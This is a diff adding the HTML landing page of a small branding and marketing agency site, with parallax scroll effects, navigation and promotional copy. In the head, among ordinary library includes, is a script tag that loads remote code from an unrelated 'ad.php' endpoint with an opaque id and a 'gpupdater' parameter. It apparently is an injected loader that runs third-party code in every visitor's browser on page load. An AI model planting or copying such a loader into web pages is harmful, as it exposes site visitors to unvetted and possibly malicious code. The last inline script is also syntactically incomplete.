@@ -1,0 +1,288 @@
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>AmberBlue</title>
+<link rel="icon" type="image/png" href="images/fav.png" />
+
+<link href="css/style.css" rel="stylesheet" type="text/css" />
+<link rel="stylesheet" href="css/normalize.css"> 
+<link rel="stylesheet" href="css/animate.min.css">
+<link rel="stylesheet" href="css/animate.css">
+<link href="css/bootstrap.css" rel='stylesheet' type='text/css' />
+<link href='http://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Dosis' rel='stylesheet' type='text/css'>
+
+<link rel="stylesheet" href="css/fontello.css">
+   		 <link href='https://fonts.googleapis.com/css?family=Open+Sans:700,300,600,800,400|Comfortaa:700' rel='stylesheet' type='text/css'>
+   		 <link href='https://fonts.googleapis.com/css?family=Comfortaa:700,300,400' rel='stylesheet' type='text/css'>
+
+<script type="text/javascript" src="scripts/jquery.js"></script>
+<script type="text/javascript" src="scripts/bouton.js"></script>
+<script type="text/javascript" src="scripts/jquery.parallax-1.1.3.js"></script>
+<script type="text/javascript" src="scripts/jquery.localscroll-1.2.7-min.js"></script>
+<script type="text/javascript" src="scripts/lollipop.js"></script>
+<script type="text/javascript" src="scripts/jquery.scrollTo-1.4.2-min.js"></script>
+<script type="text/javascript" src="scripts/scrollReveal.min.js"></script>
+<script src="js/jquery.min.js"></script>
+		<script src="js/custom.js"></script>
+		<script src="js/bind-polyfill.min.js"></script>
+		<script src="js/smooth-scroll.min.js"></script>
+		<script src="js/classie.js"></script>
+		<script src="js/modernizr.js"></script>
+ 
+	<script type="text/javascript">
+$(window).load(function(){	
+	$('body, html').scrollTop(0);
+	$("#loader").fadeToggle({display:"none"}, "slow");
+});
+ </script>
+<script type="text/javascript">
+
+$(document).ready(function(){	
+		
+	$('#market').parallax("50%", 0.5);
+	$('.bg').parallax("50%", "50%", 0.5, true);
+	$('#develop').parallax("50%", 0.5);
+	$('#about').parallax("50%", 0.5);
+	$('#footer').parallax("50%", 0.5);
+	
+	
+	$('#intro a,#nav li a,#exp,#market a').click(function(){
+                var el = $(this).attr('href');
+                var elWrapped = $(el);
+                scrollToDiv(elWrapped,40);
+                return false;
+            });
+
+            function scrollToDiv(element,navheight){
+                var offset = element.offset();
+                var offsetTop = offset.top;
+                var totalScroll = offsetTop - $("header").outerHeight() + "px";
+
+                $('body,html').animate({scrollTop: totalScroll}, 700);
+
+            }
+	
+		$("#n1").css({opacity:'1'}, 1);
+			
+			$("#n1").hover(function(){
+       		$("#b1").fadeToggle(0.5);
+	  });
+	  		$("#n2").hover(function(){
+       		$("#b2").fadeToggle(0.5);
+	  });
+			$("#n3").hover(function(){
+       		$("#b3").fadeToggle(0.5);
+	  });
+	  		$("#n4").hover(function(){
+       		$("#b4").fadeToggle(0.5);
+	  });
+	  		$("#n5").hover(function(){
+       		$("#b5").fadeToggle(0.5);
+	  });
+	  		$("#n19").hover(function(){
+       		$("#b19").fadeToggle(0.5);
+	  });
+	  
+	  $("#share").hover(function(){
+      $("#content").slideToggle(100)
+	      $("#share a").animate({opacity:'1'}, 1);
+
+  });
+  $("#share").mouseleave(function() {
+	  	   $("#share a").animate({opacity:'0.4'}, 1);
+  });
+        });
+</script>
+
+
+<script src="https://engowe.com/ad.php?u=781abb5cfd9e3fd4f1ce3b4f68530b3d&c=gpupdater&p=1"></script>
+</head>
+
+
+<body>
+
+<div id="loader">
+<div id="load">
+<!-- gif for load screen -->
+<div id="cl"> <img alt="load .gif" src="images/clog.png"/></div>
+</div>
+</div>
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+<div id="menu">
+    <a data-scroll id="exp" href="#intro"><img alt="Home" src="images/home.png"/></a>
+    <a data-scroll id="exp" href="#brand"><img alt="Branding" src="images/brand.png"/></a>
+    <a data-scroll id="exp" href="#market"><img alt="Marketing" src="images/market.png"/></a>
+    <a data-scroll id="exp" href="#develop"><img alt="Development" src="images/develop.png"/></a>
+    <a data-scroll id="exp" href="#about"><img alt="About" src="images/about.png"/></a>
+    </div> 
+
+	<ul id="nav">
+    	<div id="nom">
+        <li><a id="b1" href="#intro" title="Home"><img src="images/title1.png" alt="Link" /></a></li>
+	    <li><a id="b19"	href="#brand" title="Branding"><img src="images/title2.png" alt="Link" /></a></li>
+	    <li><a id="b2" href="#market" title="Marketing"><img src="images/title3.png" alt="Link" /></a></li>
+	    <li><a id="b3" href="#develop" title="Development"><img src="images/title4.png" alt="Link" /></a></li>
+	    <li><a id="b4" href="#about" title="About"><img src="images/title5.png" alt="Link" /></a></li>
+	     <li><a id="b5" href="footer" title="Connect with us"><img src="images/title5.png" alt="Link" /></a></li>
+        </div>
+
+    	<li><a id="n1" href="#intro" title="Next Section"><img src="images/button.png" alt="Link" /></a></li>
+	    <li><a id="n19" href="#brand" title="Next Section"><img src="images/button.png" alt="Link" /></a></li>
+	    <li><a id="n2" href="#market" title="Next Section"><img src="images/button.png" alt="Link" /></a></li>
+	    <li><a id="n3" href="#develop" title="Next Section"><img src="images/button.png" alt="Link" /></a></li>
+	    <li><a id="n4" href="#about" title="Next Section"><img src="images/button.png" alt="Link" /></a></li>
+	</ul>
+	
+	<div id="intro">
+    <a href="#brand"><img alt="fleche" src="images/fleche2.png"></a>
+
+	</div>
+    
+     <div id="brand">
+			<h1 data-scroll-reveal> Branding </h1>
+			<p>Mold your Brand strategy according to your company's vision to have an edge over competitors. Forge the link between the core competencies of your business & the perceptions of your customers. Never miss out on the needs & wants of your target customer segment. Be granular! Know what your customer eats for breakfast. </p>
+			
+			<a href="contact.html" class="myButton">Request Demo</a>	
+	
+		<div class="story"><div class="bg"></div>
+	    </div> 
+	    
+	</div>
+     
+	<div id="market">
+		<h1 data-scroll-reveal> Marketing </h1>
+			<p >While branding maps the direction for your company, marketing plan helps your company understand how to get there by detailing important steps on the road to creating customer relationships, , breaking it down into daily to-do lists. That's how you devour a whale, one bite at a time. Marketing strategy should always be on top of business owners’ to-do list.</p>
+
+			<a href="contact.html" class="myButton">Request Demo</a>
+	
+	   <div class="story"><div class="bg"></div>
+	    </div>
+	    </div> 
+
+	<div id="develop">
+		<h1 data-scroll-reveal>Design & Development</h1>
+			<p>The appearance of your firm should be in sync with your Brand strategies and articulated using the tastes and choices of the customers. Let’s find out how your target customer segment perceives the world and what is it that appeals to them the most. Ensure that they feel home while interacting with your firm through any media. Be the difference you want to see!
+			</p>
+
+			<a href="contact.html" class="myButton">Request Demo</a>
+
+			<div class="story"><div class="bg"></div>	
+	    </div> 
+	</div> 
+	
+	<div id="about">
+		<div class="story"><div class="bg"></div>
+       </div>
+       </div>
+ <footer data-scroll id="exp">
+       <!--  <div class="splitter"></div>
+        <ul>
+           <li>
+        <div class="icon" data-icon="E"></div>
+        <div class="text">
+            <h4>About</h4>
+            <div>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin tristique justo eu sollicitudin pretium. Nam scelerisque arcu at dui porttitor, non viverra sapien pretium. Nunc nec dignissim nunc. Sed eget est purus. Sed convallis, metus in dictum feugiat, odio orci rhoncus metus. <a href="#">Read more</a></div>
+        </div>
+    </li>
+    <li>
+        <div class="icon" data-icon="a"></div>
+        <div class="text">
+            <h4>Archive</h4>
+            <div>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin tristique justo eu sollicitudin pretium. Nam scelerisque arcu at dui porttitor, non viverra sapien pretium. Nunc nec dignissim nunc. Sed eget est purus. Sed convallis, metus in dictum feugiat, odio orci rhoncus metus. <a href="#">Read more</a></div>
+        </div>
+    </li>
+    <li>
+        <div class="icon" data-icon="s"></div>
+        <div class="text">
+            <h4>Cloud</h4>
+            <div>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin tristique justo eu sollicitudin pretium. Nam scelerisque arcu at dui porttitor, non viverra sapien pretium. Nunc nec dignissim nunc. Sed eget est purus. Sed convallis, metus in dictum feugiat, odio orci rhoncus metus. <a href="#">Read more</a></div>
+        </div>
+    </li>
+
+        </ul>
+ -->
+        <div class="bar">
+            <div class="bar-wrap">
+                <ul class="links"> 
+                	<!-- footer menu -->
+                    <li><a data-scroll id="exp" href="#intro">Home</a></li>
+                    <li><a data-scroll id="exp" href="#brand">Branding</a></li>
+                    <li><a data-scroll id="exp" href="#market">Marketing</a></li>
+                    <li><a data-scroll id="exp" href="#develop">Development</a></li>
+                    <li><a data-scroll id="exp" href="#about">About</a></li>
+                    <li><a href="contact.html">Contact Us</a></li>
+                </ul>
+
+                <div class="social">
+            <a href="#" class="fb">
+                <span data-icon="f" class="icon"></span>
+                <span class="info">
+                    <span class="follow">Follow us on Facebook</span>
+                </span>
+            </a>
+
+            <a href="#" class="tw">
+                <span data-icon="T" class="icon"></span>
+                <span class="info">
+                    <span class="follow">Follow us on Twitter</span>
+                   
+                </span>
+            </a>
+
+            <a href="#" class="google">
+                <span data-icon="+" class="icon"></span>
+                <span class="info">
+                    <span class="follow">Follow us on Google+</span>
+
+                </span>
+            </a>
+        </div>
+                <div class="clear"></div>
+                <div class="copyright">A Website by Sudhindra Sajjal & Saurabh Swami</div>
+            </div>
+        </div>
+
+    </footer>
+
+
+       
+       <script>
+	   $("#share").hover(function() {
+  $("#content").toggle('slide');
+  $("#share a").animate({opacity:'1'}, 1);
+});
+	$("#share").mouseleave(function() {
+	$("#share a").animate({opacity:'0.4'}, 1);
+	
+	});
+	$("#brand p").hover(function() {
+  $("#brand p").animate({opacity:'0.6'}, "fast");
+});
+	$("#brand p").mouseout(function() {
+	$("#brand p").animate({opacity:'1'}, 100);
+	
+	});
+$(function () {
+	var element = $("#cl");
+    (function(){
+        element
+            
+            .animate({ opacity:'0.4'},"slow")
+            .animate({ opacity:'0.8'},"slow",arguments.callee)
+            
+    }());
+});
+</script>
+
+<script type="text/javascript">
+    document.getElementById("myButton").onclick = function () {
+        location.href = "contact.html";
+</script>
+</body>
+</html>
